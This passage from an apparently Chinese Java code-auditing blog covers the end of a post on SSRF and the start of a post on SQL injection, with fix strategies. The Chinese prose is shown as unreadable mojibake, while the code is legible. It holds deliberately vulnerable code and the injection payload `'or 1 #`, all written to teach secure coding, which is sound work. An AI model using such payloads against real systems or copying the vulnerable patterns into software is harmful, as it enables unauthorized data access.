è¯·æ±‚éƒ½å·²ç»å‘å‡ºå»äº†ã€‚</p><h2 id="å¦ä¸€ç§å†™æ³•"><a href="#å¦ä¸€ç§å†™æ³•" class="headerlink" title="å¦ä¸€ç§å†™æ³•"></a>å¦ä¸€ç§å†™æ³•</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">HttpURLConnection con = (HttpURLConnection) u.openConnection();</span><br><span class="line">con.setRequestMethod(<span class="string">"GET"</span>);</span><br><span class="line">con.setRequestProperty(<span class="string">"User-Agent"</span>, <span class="string">"Mozilla/5.0"</span>);</span><br><span class="line">con.getInputStream();</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>å‡è®¾è¿™é‡Œçš„ <code>URL</code> ä½¿ç”¨æˆ·å¯æ§çš„ï¼Œè¿™æ®µä»£ç ç›¸å¯¹äºä¸Šä¸€æ®µæ¥è¯´ï¼Œä¼šç¨å¾® â€œå®‰å…¨â€ äº›ã€‚å¦‚æœæ”»å‡»è€…æƒ³è¦ä½¿ç”¨ <code>gopher</code> åè®®æ”»å‡»å†…ç½‘æœåŠ¡ï¼Œåœ¨ç¬¬ <code>2</code> è¡Œæ—¶ï¼Œä¼šç”±äºç±»å‹å¼ºåˆ¶è½¬æ¢å¤±è´¥è€ŒæŠ›å‡ºå¼‚å¸¸ã€‚åœ¨å¼‚å¸¸æŠ›å‡ºå‰ï¼Œä¸€ç›´æ²¡æœ‰è°ƒç”¨åˆ° <code>connect()</code> æ–¹æ³•ï¼Œæ‰€ä»¥è¯·æ±‚å¹¶æ²¡æœ‰å‘å‡ºå»ã€‚</p><blockquote><p>ç¬¬ <code>2</code> è¡Œçš„ç±»å‹è½¬æ¢ç›¸å½“äºé™å®šäº†åè®®ï¼Œåœ¨èƒ½å¤Ÿæ˜ç¡®ä½¿ç”¨çš„åè®®çš„æƒ…å†µä¸‹ï¼Œå»ºè®®ç”¨è¿™ç§æ–¹å¼å¯¹åè®®åšé™åˆ¶ã€‚</p></blockquote><h1 id="å…¶å®ƒå‘èµ·è¯·æ±‚çš„ä¾‹å­"><a href="#å…¶å®ƒå‘èµ·è¯·æ±‚çš„ä¾‹å­" class="headerlink" title="å…¶å®ƒå‘èµ·è¯·æ±‚çš„ä¾‹å­"></a>å…¶å®ƒå‘èµ·è¯·æ±‚çš„ä¾‹å­</h1><h2 id="javax-imageio-ImageIO"><a href="#javax-imageio-ImageIO" class="headerlink" title="javax.imageio.ImageIO"></a>javax.imageio.ImageIO</h2><p>è¿™æ˜¯ <code>JDK</code> è‡ªå¸¦çš„ç±»ï¼Œå®ƒçš„ <code>read()</code> æ–¹æ³•ï¼Œç”¨æ¥åŠ è½½å›¾ç‰‡ã€‚å®ƒå¯ä»¥ä¼ å…¥ä¸€ä¸ª <code>URL</code> å¯¹è±¡ï¼Œä¸”æ²¡æœ‰åè®®é™åˆ¶ï¼Œå¦‚ä¸‹ï¼š</p><p>ImageIO.java:1386</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> BufferedImage <span class="title">read</span><span class="params">(URL input)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"input == null!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InputStream istream = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        istream = input.openStream();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IIOException(<span class="string">"Can't get input stream from URL!"</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    ImageInputStream stream = createImageInputStream(istream);</span><br><span class="line">    BufferedImage bi;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        bi = read(stream);</span><br><span class="line">        <span class="keyword">if</span> (bi == <span class="keyword">null</span>) &#123;</span><br><span class="line">            stream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        istream.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å¦‚æœæœåŠ¡å™¨åœ¨åŠ è½½å›¾ç‰‡æ—¶ï¼Œ<code>URL</code> æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨ <code>SSRF</code> æ¼æ´ã€‚</strong></p><h2 id="HttpClient"><a href="#HttpClient" class="headerlink" title="HttpClient"></a>HttpClient</h2><p>ä¸€ä¸ª <code>get</code> è¯·æ±‚çš„ä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CloseableHttpClient httpClient = HttpClients.createDefault();</span><br><span class="line">HttpGet getRequest = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line">HttpResponse response = httpClient.execute(getRequest);</span><br></pre></td></tr></table></figure><p>é—®é¢˜åŒä¸Šã€‚</p><h2 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h2><ul><li><p>okhttp</p></li><li><p>Request</p></li><li><p>â€¦</p></li></ul><h1 id="å®¹æ˜“å‡ºç°SSRFçš„åŠŸèƒ½ç‚¹"><a href="#å®¹æ˜“å‡ºç°SSRFçš„åŠŸèƒ½ç‚¹" class="headerlink" title="å®¹æ˜“å‡ºç°SSRFçš„åŠŸèƒ½ç‚¹"></a>å®¹æ˜“å‡ºç°SSRFçš„åŠŸèƒ½ç‚¹</h1><p>åªè¦æ˜¯èƒ½å¤Ÿå¯¹å¤–å‘èµ·ç½‘ç»œè¯·æ±‚çš„åœ°æ–¹ï¼Œå°±æœ‰å¯èƒ½ä¼šå‡ºç°SSRFæ¼æ´ã€‚</p><ul><li><p>ä»æŒ‡å®šurlè·å–å†…å®¹</p></li><li><p>æ•°æ®æºè¿æ¥</p></li><li><p>åå°çŠ¶æ€åˆ·æ–°</p></li><li><p>webmail (POP3/SMTP/IMAP)</p></li><li><p>æ–‡ä»¶å¤„ç† (åŠ è½½å›¾ç‰‡/XML/PDF/ffpmg/ImageMagic)</p></li></ul><h1 id="ä¿®å¤ç­–ç•¥"><a href="#ä¿®å¤ç­–ç•¥" class="headerlink" title="ä¿®å¤ç­–ç•¥"></a>ä¿®å¤ç­–ç•¥</h1><ul><li><p>é¿å… <code>url</code> ç”¨æˆ·å¯æ§ï¼ŒåŒ…æ‹¬ <code>path</code></p></li><li><p>ç»Ÿä¸€è¯·æ±‚å“åº”åŠé”™è¯¯ä¿¡æ¯</p></li><li><p>ç™½åå•æ ¡éªŒurlåŠip</p></li><li><p>é™åˆ¶åè®®åŠç«¯å£</p></li><li><p>TTL è®¾ç½®ä¸º 0ï¼Œé˜²æ­¢ <code>DNS Rebinding</code> æ”»å‡»ï¼ˆJavaé»˜è®¤ä¸º 0ï¼‰</p></li></ul><blockquote><p>å¯ä»¥å‚è€ƒ <a href="https://joychou.org" target="_blank" rel="noopener">@JoyChou</a> å¸ˆå‚…çš„<a href="https://github.com/JoyChou93/trident/blob/master/src/main/java/SSRF.java" target="_blank" rel="noopener">ä¿®å¤æ–¹æ¡ˆ</a>ã€‚</p></blockquote><h1 id="ç›¸å…³æ–‡ç« "><a href="#ç›¸å…³æ–‡ç« " class="headerlink" title="ç›¸å…³æ–‡ç« "></a>ç›¸å…³æ–‡ç« </h1><ul><li><p><a href="https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf" target="_blank" rel="noopener">Build Your SSRF Exploit Framework</a></p></li><li><p><a href="https://joychou.org/java/javassrf.html" target="_blank" rel="noopener">SSRF in JAVA</a></p></li><li><p><a href="https://joychou.org/java/use-dnsrebinding-to-bypass-ssrf-in-java.html" target="_blank" rel="noopener">Use DNS Rebinding to Bypass SSRF in JAVA</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ä»1å¼€å§‹çš„Javaä»£ç å®¡è®¡Â·ç¬¬ä¸‰å¼¹Â·SQLæ³¨å…¥</title>
      <link href="/2018/11/15/java-audit-step-by-step-3/"/>
      <url>/2018/11/15/java-audit-step-by-step-3/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>SQLæ³¨å…¥æ˜¯ä»€ä¹ˆï¼Œæœ‰ä»€ä¹ˆç”¨ï¼Œå°±ä¸å¤šä»‹ç»äº†ã€‚æ€»ç»“ä¸‹æ¼æ´çš„åŸå› ï¼Œä¸»è¦æ˜¯ç”±äºå¼€å‘è€…å¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰åšå¥½è¿‡æ»¤ï¼Œç›´æ¥å°†ç”¨æˆ·çš„è¾“å…¥å¸¦å…¥åˆ° SQLè¯­å¥ä¸­ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·å¯ä»¥æ§åˆ¶æœåŠ¡å™¨æ‰§è¡Œçš„SQLè¯­å¥ã€‚</p><p>åœ¨ Java ä¸­ï¼Œæ“ä½œSQLçš„ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p><ol><li><p><code>java.sql.Statement</code></p></li><li><p><code>java.sql.PrepareStatement</code></p></li><li><p>ä½¿ç”¨ç¬¬ä¸‰æ–¹ <code>ORM</code> æ¡†æ¶ â€”â€” <code>MyBatis</code> æˆ– <code>Hibernate</code></p></li></ol><p>ä¸‹é¢æˆ‘ä»¬æ¥åˆ†æä»¥ä¸Šå‡ ç§æ‰§è¡ŒSQLçš„æ–¹å¼ã€‚</p><a id="more"></a><h1 id="java-sql-Statement"><a href="#java-sql-Statement" class="headerlink" title="java.sql.Statement"></a>java.sql.Statement</h1><p><code>java.sql.Statement</code> æ˜¯æœ€åŸå§‹çš„æ‰§è¡ŒSQLçš„æ¥å£ï¼Œä½¿ç”¨å®ƒæ—¶ï¼Œéœ€è¦æ‰‹åŠ¨æ‹¼æ¥SQLè¯­å¥ï¼Œå¦‚ä¸‹é¢è¿™æ ·ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"SELECT * FROM user WHERE id = '"</span> + id + <span class="string">"'"</span>;</span><br><span class="line">Statement statement = connection.createStatement();</span><br><span class="line">statement.execute(sql);</span><br></pre></td></tr></table></figure><p>å‡è®¾è¿™é‡Œ <code>id</code> å‚æ•°æ˜¯ç›´æ¥ä»ç”¨æˆ·çš„è¯·æ±‚é‡Œè·å–çš„ï¼Œå¹¶ä¸”æ²¡æœ‰ç»è¿‡è¿‡æ»¤ï¼Œé‚£ä¹ˆè¿™å¤„ä»£ç å°±ä¼šå­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚</p><p>æ„é€ è¯·æ±‚ <code>/?id=&#39;or 1 #</code>ï¼ŒæœåŠ¡å™¨å°† <code>&#39;or 1 #</code> æ‹¼æ¥åˆ° sql è¯­å¥ä¸­ï¼Œå°±ä¼šå˜æˆ <code>SELECT * FROM user WHERE id = &#39;&#39;or 1 #</code>ï¼Œå°†è¿”å› <code>user</code> è¡¨çš„æ‰€æœ‰è®°å½•ã€‚</p><p>åœ¨ä»»ä½•æ—¶å€™ï¼Œéƒ½ä¸æ¨èä½¿ç”¨ <code>java.sql.Statement</code> è¿™ç§æ–¹å¼æ¥æ‰§è¡ŒSQLã€‚</p><p>å› ä¸ºè¿™ç§æ–¹å¼å†™çš„ä»£ç å¯è¯»æ€§å¾ˆå·®ï¼Œå®¹æ˜“å‡ºé”™ï¼ŒåŒæ—¶ä¹Ÿå­˜åœ¨å¾ˆå¤§çš„å®‰å…¨éšæ‚£ã€‚</p><h1 id="java-sql-PrepareStatement"><a href="#java-sql-PrepareStatement" class="headerlink" title="java.sql.PrepareStatement"></a>java.sql.PrepareStatement</h1><p>è¿™ä¸ªæ¥å£æ˜¯å¯¹ <code>java.sql.Statement</code> çš„æ‹“å±•ï¼Œæ‹¥æœ‰äº†é˜²SQLæ³¨å…¥çš„ç‰¹æ€§ã€‚</p><blockquote><p>Tip: <code>java.sql.Statement</code> æ¯æ¬¡æ‰§è¡Œä¸€æ¡SQLï¼Œéƒ½è¦é‡æ–°ç¼–è¯‘ä¸€æ¬¡SQLã€‚è€Œ <code>java.sql.PreparedStatement</code> é¢„ç¼–è¯‘çš„æ–¹å¼ï¼Œä¼šå°†SQLç¼“å­˜åœ¨æ•°æ®åº“ï¼Œå¯ä»¥é‡å¤è°ƒç”¨ï¼Œç›¸æ¯” <code>Statement</code> æ•ˆç‡è¦é«˜ä¸€äº›ã€‚</p></blockquote><p>ä½¿ç”¨æ—¶ï¼Œåœ¨SQLè¯­å¥ä¸­ï¼Œç”¨ <code>?</code> ä½œä¸ºå ä½ç¬¦ï¼Œä»£æ›¿éœ€è¦ä¼ å…¥çš„å‚æ•°ï¼Œç„¶åå°†è¯¥è¯­å¥ä¼ é€’ç»™æ•°æ®åº“ï¼Œæ•°æ®åº“ä¼šå¯¹è¿™æ¡è¯­å¥è¿›è¡Œé¢„ç¼–è¯‘ã€‚å¦‚æœè¦æ‰§è¡Œè¿™æ¡SQLï¼Œåªè¦ç”¨ç‰¹å®šçš„ <code>set</code> æ–¹æ³•ï¼Œå°†ä¼ å…¥çš„å‚æ•°è®¾ç½®åˆ°SQLè¯­å¥ä¸­çš„æŒ‡å®šä½ç½®ï¼Œç„¶åè°ƒç”¨ <code>execute</code> æ–¹æ³•æ‰§è¡Œè¿™æ¡å®Œæ•´çš„SQLã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"SELECT * FROM user WHERE id = ?"</span>;</span><br><span class="line"><span class="comment">//é¢„ç¼–è¯‘è¯­å¥</span></span><br><span class="line">PreparedStatement preparedStatement = connection.prepareStatement(sql);</span><br><span class="line"><span class="comment">//å¡«å…¥å‚æ•°</span></span><br><span class="line">preparedStatement.setString(<span class="number">1</span>,reqStuId);</span><br><span class="line">preparedStatement.executeQuery();</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œå¦‚æœæˆ‘ç”¨ä¹‹å‰çš„è¯·æ±‚æ”»å‡»ï¼Œæ‰§è¡Œçš„SQLä¼šå˜æˆ <code>SELECT * FROM user WHERE id = &#39;\&#39;or 1 #&#39;</code>ï¼Œå¯ä»¥çœ‹åˆ°å•å¼•å·æ˜¯è¢«è½¬ä¹‰äº†ï¼ŒåŒæ—¶å‚æ•°ä¹Ÿè¢«ä¸€å¯¹å•å¼•å·åŒ…è£¹ï¼Œæ•°å­—å‹æ³¨å…¥ä¹Ÿä¸å­˜åœ¨äº†ã€‚</p><h2 id="ç‰¹æ®Šæƒ…å†µ"><a href="#ç‰¹æ®Šæƒ…å†µ" class="headerlink" title="ç‰¹æ®Šæƒ…å†µ"></a>ç‰¹æ®Šæƒ…å†µ</h2><h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><p>æˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œé€šè¿‡å ä½ç¬¦ä¼ å‚ï¼Œä¸ç®¡ä¼ é€’çš„æ˜¯ä»€ä¹ˆç±»å‹çš„å€¼ï¼Œéƒ½ä¼šè¢«å•å¼•å·åŒ…è£¹ã€‚è€Œä½¿ç”¨ <code>ORDER BY</code> æ—¶ï¼Œè¦æ±‚ä¼ å…¥çš„æ˜¯å­—æ®µåæˆ–è€…æ˜¯å­—æ®µä½ç½®ï¼Œå¦‚ï¼š</p><ol><li><p><code>SELECT * FROM user ORDER BY id</code></p></li><li><p><code>SELECT * FROM user ORDER BY 1</code></p></li></ol><p><strong>å¦‚æœä¼ å…¥çš„æ˜¯å¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆ <code>ORDER BY</code> ä¼šå¤±æ•ˆ</strong>ï¼Œå¦‚ï¼š<code>SELECT * FROM user ORDER BY &#39;id&#39;</code>ã€‚</p><p>æ‰€ä»¥ï¼Œå¦‚æœè¦åŠ¨æ€ä¼ å…¥ <code>ORDER BY</code> å‚æ•°ï¼Œåªèƒ½ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ï¼Œå¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"SELECT * FROM user ORDER BY "</span> + column;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™æ ·ä¾ç„¶å¯èƒ½ä¼šå­˜åœ¨SQLæ³¨å…¥çš„é—®é¢˜ï¼Œåœ¨ <code>Java</code> ä¸­ä¼šæœ‰ä¸¤ç§æƒ…å†µï¼š</p><ol><li><p>column æ˜¯å­—ç¬¦ä¸²å‹</p><p> è¿™ç§æƒ…å†µå’Œ <code>Statement</code> ä¸­æè¿°çš„ä¸€æ ·ï¼Œæ˜¯å­˜åœ¨æ³¨å…¥çš„ã€‚è¦é˜²å¾¡å°±å¿…é¡»è¦æ‰‹åŠ¨è¿‡æ»¤ï¼Œæˆ–è€…å°†å­—æ®µåç¡¬ç¼–ç åˆ° <code>SQL</code> è¯­å¥ä¸­ï¼Œæ¯”å¦‚ï¼š</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String column = <span class="string">"id"</span>;</span><br><span class="line">String sql =<span class="string">""</span>;</span><br><span class="line"><span class="keyword">switch</span>(column)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"id"</span>:</span><br><span class="line">        sql = <span class="string">"SELECT * FROM user ORDER BY id"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"username"</span>:</span><br><span class="line">        sql = <span class="string">"SELECT * FROM user ORDER BY username"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>column æ˜¯ int å‹</p><p> å› ä¸º <code>Java</code> æ˜¯å¼ºç±»å‹è¯­è¨€ï¼Œå½“ç”¨æˆ·ä¼ é€’çš„å‚æ•°ä¸åå°å®šä¹‰çš„å‚æ•°ç±»å‹ä¸åŒ¹é…ï¼Œç¨‹åºä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œèµ‹å€¼å¤±è´¥ã€‚æ‰€ä»¥ï¼Œä¸ä¼šå­˜åœ¨æ³¨å…¥çš„é—®é¢˜ã€‚</p></li></ol><blockquote><p>ç±»ä¼¼çš„ï¼Œ <code>GROUP BY</code> ä¹Ÿä¼šæœ‰åŒæ ·çš„é—®é¢˜ã€‚</p></blockquote><h1 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h1><p>åŸºç¡€ç¯‡æåˆ°çš„ <code>JEESNS</code> ç”¨çš„å°±æ˜¯ <code>MyBatis</code>ï¼Œç•¥è¿‡ä»‹ç»ã€‚</p><p><code>MyBatis</code> ä½¿ç”¨å†…è”å‚æ•° <code>${example}</code> æˆ– <code>#{example}</code>ï¼Œå°†æŸ¥è¯¢çš„å±æ€§å’Œå‚æ•°åšç»‘å®šï¼Œå¦‚ä¸‹ï¼š</p><p>${}</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectStudentByStuId"</span> <span class="attr">resultMap</span>=<span class="string">"studentMap"</span>&gt;</span></span><br><span class="line">    SELECT *</span><br><span class="line">    FROM student</span><br><span class="line">    WHERE stu_id = $&#123;stuId&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>#{}</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectStudentByStuId"</span> <span class="attr">resultMap</span>=<span class="string">"studentMap"</span>&gt;</span></span><br><span class="line">    SELECT *</span><br><span class="line">    FROM student</span><br><span class="line">    WHERE stu_id = #&#123;stuId&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸¤ç§æ–¹å¼æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿæ¥ç€çœ‹ã€‚</p><h2 id="ï¼ˆä¸å®‰å…¨çš„å†™æ³•ï¼‰"><a href="#ï¼ˆä¸å®‰å…¨çš„å†™æ³•ï¼‰" class="headerlink" title="${} ï¼ˆä¸å®‰å…¨çš„å†™æ³•ï¼‰"></a>${} <em>ï¼ˆä¸å®‰å…¨çš„å†™æ³•ï¼‰</em></h2><p>ä½¿ç”¨ <code>${foo}</code> è¿™æ ·æ ¼å¼çš„ä¼ å…¥å‚æ•°ä¼šç›´æ¥å‚ä¸SQLç¼–è¯‘ï¼Œç±»ä¼¼å­—ç¬¦ä¸²æ‹¼æ¥çš„æ•ˆæœï¼Œæ˜¯å­˜åœ¨SQLæ³¨å…¥æ¼æ´çš„ã€‚æ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸ä¼šç”¨è¿™ç§æ–¹å¼ç»‘å®šå‚æ•°ã€‚</p><h2 id=""><a href="#" class="headerlink" title="#{}"></a>#{}</h2><p>ä½¿ç”¨ <code>#{}</code> åšå‚æ•°ç»‘å®šæ—¶ï¼Œ <code>MyBatis</code> ä¼šå°†SQLè¯­å¥è¿›è¡Œé¢„ç¼–è¯‘ï¼Œé¿å…SQLæ³¨å…¥çš„é—®é¢˜ã€‚</p><p><code>MyBatis</code> é¢„ç¼–è¯‘æ¨¡å¼çš„å®ç°ï¼Œåœ¨åº•å±‚åŒæ ·æ˜¯ä¾èµ–äº <code>java.sql.PreparedStatement</code>ï¼Œæ‰€ä»¥ <code>PreparedStatement</code> å­˜åœ¨çš„é—®é¢˜ï¼Œè¿™é‡Œä¹Ÿä¼šå­˜åœ¨ã€‚</p><p><code>ORDER BY</code> åªèƒ½é€šè¿‡ <code>${}</code> ä¼ é€’ã€‚ä¸ºäº†é¿å…SQLæ³¨å…¥ï¼Œéœ€è¦æ‰‹åŠ¨è¿‡æ»¤ï¼Œæˆ–è€…åœ¨SQLé‡Œç¡¬ç¼–ç  <code>ORDER BY</code> çš„å­—æ®µåã€‚</p><p>æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ç§æƒ…å†µ â€”â€” <code>LIKE</code> æ¨¡ç³ŠæŸ¥è¯¢ã€‚</p><p>çœ‹ä¸‹é¢è¿™ä¸ªå†™æ³•ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectStudentByFuzzyQuery"</span> <span class="attr">resultMap</span>=<span class="string">"studentMap"</span>&gt;</span></span><br><span class="line">    SELECT *</span><br><span class="line">    FROM student</span><br><span class="line">    WHERE student.stu_name</span><br><span class="line">            LIKE '%#&#123;stuName&#125;%'</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œï¼Œ<code>MyBatis</code> ä¼šæŠŠ <code>%#{stuName}%</code> ä½œä¸ºè¦æŸ¥è¯¢çš„å‚æ•°ï¼Œæ•°æ®åº“ä¼šæ‰§è¡Œ <code>SELECT * FROM student WHERE student.stu_name LIKE &#39;%#{stuName}%&#39;</code>ï¼Œå¯¼è‡´æŸ¥è¯¢å¤±è´¥ï¼Œæ‰€ä»¥è¿™é‡Œåªèƒ½ç”¨ <code>${}</code> çš„æ–¹å¼ä¼ å…¥ã€‚è€Œå¦‚æœç”¨ <code>${}</code> åˆå­˜åœ¨SQLæ³¨å…¥çš„é£é™©ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>æœ€å¥½çš„æ–¹æ³•æ˜¯ï¼Œä½¿ç”¨æ•°æ®åº“è‡ªå¸¦çš„ <code>CONCAT</code> ï¼Œå°† <code>%</code> å’Œæˆ‘ä»¬ç”¨ <code>#{}</code> ä¼ å…¥å‚æ•°è¿æ¥èµ·æ¥ï¼Œè¿™æ ·å°±æ—¢ä¸å­˜åœ¨æ³¨å…¥çš„é—®é¢˜ï¼Œä¹Ÿèƒ½æ»¡è¶³éœ€æ±‚å•¦ã€‚ç¤ºä¾‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectStudentByFuzzyQuery"</span> <span class="attr">resultMap</span>=<span class="string">"studentMap"</span>&gt;</span></span><br><span class="line">    SELECT *</span><br><span class="line">    FROM student</span><br><span class="line">    WHERE student.stu_name</span><br><span class="line">            LIKE CONCAT('%',#&#123;stuName&#125;,'%')</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Hibernate"><a href="#Hibernate" class="headerlink" title="Hibernate"></a>Hibernate</h1><p><code>Hibernate</code> æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„ <code>ORM</code> æ¡†æ¶ï¼Œå¯ä»¥è‡ªåŠ¨ç”Ÿæˆ <code>SQL</code> è¯­å¥ï¼Œé€šå¸¸ä¸ <code>Struts</code>ã€<code>Spring</code> ä¸€èµ·æ­é…ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç†ŸçŸ¥çš„ <code>SSH</code> æ¡†æ¶ã€‚</p><p><code>Hibernate</code> æ”¯æŒå¤šç§æ“ä½œæ•°æ®åº“çš„æ–¹å¼ï¼ŒåŒ…æ‹¬åŸç”Ÿçš„ <code>SQL</code>ï¼Œä»¥åŠè‡ªå®¶çš„ <code>HQL</code>ã€‚</p><h2 id="åŸç”ŸSQL"><a href="#åŸç”ŸSQL" class="headerlink" title="åŸç”ŸSQL"></a>åŸç”ŸSQL</h2><p>åŸç”Ÿ <code>SQL</code> çš„æ³¨å…¥å’Œå‰é¢ä»‹ç»è¿‡çš„æ³¨å…¥éƒ½ä¸€æ ·ï¼Œéƒ½æ˜¯æ‹¼æ¥çš„é—®é¢˜ï¼Œå°±ä¸ç»†è®²äº†ã€‚è¿™é‡Œä»‹ç»ä¸‹ <code>Hibernate</code> å†™åŸç”Ÿ <code>SQL</code> æ—¶ï¼Œå¯èƒ½ä¼šç”¨åˆ°çš„å‡ ç§å†™æ³•å§ã€‚</p><p>è¦ä½¿ç”¨åŸç”Ÿ <code>SQL</code> ï¼Œéƒ½ä¼šè°ƒç”¨åˆ° <code>Sessions.createSQLQuery()</code> æ–¹æ³•ã€‚</p><p>ä¸‹é¢çœ‹ç¬¬ä¸€ç§å†™æ³•ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">session.beginTranscation();</span><br><span class="line">List list = session.createSQLQuery(<span class="string">"SELECT id,name FROM student"</span>).list();</span><br><span class="line">session.getTranscation().commit();</span><br><span 